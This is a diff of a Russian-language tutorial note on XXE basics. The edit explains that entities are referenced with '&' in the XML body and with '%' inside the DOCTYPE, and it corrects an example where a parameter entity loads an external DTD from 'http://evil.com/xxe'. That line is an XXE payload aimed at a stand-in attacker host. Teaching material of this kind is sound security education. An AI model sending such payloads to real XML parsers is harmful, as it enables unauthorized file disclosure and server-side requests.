@@ -2,7 +2,7 @@
 
 ## Basic
 
-1 Можем использовать объявленную сущность в теле XML
+1 Можем использовать объявленную сущность в теле XML (здесь через &)
 
 ```markup
 <?xml version="1.0" encoding="UTF-8"?>
@@ -12,11 +12,11 @@
 </root>
 ```
 
-2 Можем использовать объявленную сущность как определение следующей сущности в Doctype.
+2 Можем использовать объявленную сущность как определение следующей сущности в Doctype (здесь через %).
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/xxe"> &xxe; ]>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe; ]>
 <root></root>
 ```
 
